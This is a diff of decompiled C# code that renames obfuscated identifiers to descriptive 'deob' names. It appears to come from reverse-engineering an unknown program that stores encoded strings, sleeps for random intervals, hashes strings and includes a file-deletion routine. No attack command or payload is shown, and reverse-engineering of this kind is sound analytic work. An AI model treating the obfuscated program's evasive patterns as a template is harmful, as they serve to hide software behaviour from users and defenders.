       arrayList.Add((object) "껧럙ꫬ꣑뷼ꓑꋈ믏뻇볉ꇰ룞뚃꿮늊냘闕賍誨鏇蛏蒾駻胄黷蟥體飛跢钠鋩诠温氱焘栣晙缏戒怮攓簰稲挽瘙瑁椉瀈个圿䨀䡽崣䑲䉤嬻帏尓䄿堯嘞似刪倥㕝Ɑ⩡㍆♯⑅㥔⁏㹿❧㩠㡏ⵍ㑷\x324E⭔\x0E77ళᅣࡌُὙɭ{թᱩ᩸̽ᙠᑽैၤ\xEEC8\xF7C5\xEAC1\xE8D1ﷂ\xE4B3\xE295ﮮﺽﲵ\xE189\xF8B6\xF69F\xEFA1\xF2A1\xF089햕첻쫷펜욇쒟�삭�있��춳풎튋쮼껁곴뇷\xA8DDꛓ뿷ꋣꃯꗀ벓뫮ꏍ뛑듏꧔냛軓韝諉裱鶭蓩苀鯑麵鳽臃飫雯迩鋢邪甸氼樨猓春損礸怑縒朗稼砤洣琭爳歜丗䰘儇䡰䘭弝䈋䀈䔴尙婧䍳嘧吚䤩倿⸈㝼⩝⠗㵓⑃≥㭱㸆㱕℔㡀㙭⼘㈂こᕊోੋ\x137Cٴѐ\x1979MṔݯᩮᡯലᑁቷ\x0B5E\xEE8A\xECD1\xF197\xE89B\xE6A9ﾙ\xE28E\xE0DF\xE58Bﲎ缾\xE387\xF6B1\xF4BF\xE985\xF0C3컬힝쪘좤�쒀슡\xDBBF\xDE9F�솢�횓쾙튘킚뗡곋ꪓ돠ꛇꓪ릎ꃙ뻽\xA7E8뫲룗궟듥닾ꯦ軫賴釻裮蛦鿕苐肿藌鲭髀菎雾铋觘都渓睄樍栫素摔戇笏縴簷愉砷瘏漋爖瀺唝䰙䨦占䘟䐊天䀸帆䝳娐堠䴓吐划䬀\x2E6Fⱉㅄ");
-      return (string) arrayList[deobController.smethod_6(0, arrayList.Count)];
+      return (string) arrayList[deobController.deobRandomNumber(0, arrayList.Count)];
     }
 
-    public static string smethod_2()
+    public static string deobGetRandomFruit()
     {
-      string[] strArray = new string[69]
+      string[] deobFruitArray = new string[69]
       {
         "\xEAAF\xF3A4\xE6C6\xE4BA醴",
         "䘖䐀夊䀅平䜅娎",
@@ -336,39 +336,39 @@ label_2:
         "爻灝唛䰟䨎却䘓䐆",
         "堖嘈佨刖"
       };
-      return strArray[deobController.smethod_6(0, strArray.Length)].ToLower();
+      return deobFruitArray[deobController.deobRandomNumber(0, deobFruitArray.Length)].ToLower();
     }
 
-    public string method_4(string string_4, string string_5, string string_6)
+    public string method_4(string deobInput1, string deobInput2, string deobInput3)
     {
-      string str1;
-      if (string_4 == null)
+      string deobOutputString;
+      if (deobInput1 == null)
       {
-        str1 = "";
+        deobOutputString = "";
       }
       else
       {
-        string str2 = "";
-        string_4 = string_4.ToLower();
-        for (int index1 = 0; index1 < string_4.Length; ++index1)
+        string deobTempString = "";
+        deobInput1 = deobInput1.ToLower();
+        for (int deobLoopCount = 0; deobLoopCount < deobInput1.Length; ++deobLoopCount)
         {
-          char ch = string_4[index1];
+          char ch = deobInput1[deobLoopCount];
           try
           {
-            int index2 = string_5.IndexOf(ch);
-            str2 += (string) (object) string_6[index2];
+            int index2 = deobInput2.IndexOf(ch);
+            deobTempString += (string) (object) deobInput3[index2];
           }
           catch
           {
-            str2 += (string) (object) ch;
+            deobTempString += (string) (object) ch;
           }
         }
-        str1 = str2.ToUpper();
+        deobOutputString = deobTempString.ToUpper();
       }
-      return str1;
+      return deobOutputString;
     }
 
-    private static string smethod_3(MD5 md5_0, string string_4)
+    private static string deobMD5String(MD5 md5_0, string string_4)
     {
       byte[] hash = md5_0.ComputeHash(Encoding.UTF8.GetBytes(string_4));
       StringBuilder stringBuilder = new StringBuilder();
@@ -377,7 +377,7 @@ label_2:
       return stringBuilder.ToString();
     }
 
-    private static string smethod_4(SHA1 sha1_0, string string_4)
+    private static string deobSHA1String(SHA1 sha1_0, string string_4)
     {
       byte[] hash = sha1_0.ComputeHash(Encoding.UTF8.GetBytes(string_4));
       StringBuilder stringBuilder = new StringBuilder();
@@ -386,7 +386,7 @@ label_2:
       return stringBuilder.ToString();
     }
 
-    private static string smethod_5(SHA256 sha256_0, string string_4)
+    private static string deobSHA256String(SHA256 sha256_0, string string_4)
     {
       byte[] hash = sha256_0.ComputeHash(Encoding.UTF8.GetBytes(string_4));
       StringBuilder stringBuilder = new StringBuilder();
@@ -395,24 +395,24 @@ label_2:
       return stringBuilder.ToString();
     }
 
-    public void method_5(StreamWriter streamWriter_0, string string_4)
+    public void deobWriteLine(StreamWriter streamWriter_0, string string_4)
     {
       streamWriter_0.WriteLine(string_4);
       streamWriter_0.Flush();
     }
 
-    public void method_6(int int_0, int int_1)
+    public void deobSleepForRandom(int int_0, int int_1)
     {
       Thread.Sleep(new Random().Next(int_0, int_1) * 1000);
     }
 
-    public static int smethod_6(int int_0, int int_1)
+    public static int deobRandomNumber(int deobNumberFrom, int deobNumberTo)
     {
       lock (deobController.deobGlobalObject)
-        return deobController.deobGlobalRandom.Next(int_0, int_1);
+        return deobController.deobGlobalRandom.Next(deobNumberFrom, deobNumberTo);
     }
 
-    public void method_7()
+    public void deobDeleteWriteFile()
     {
       try
       {
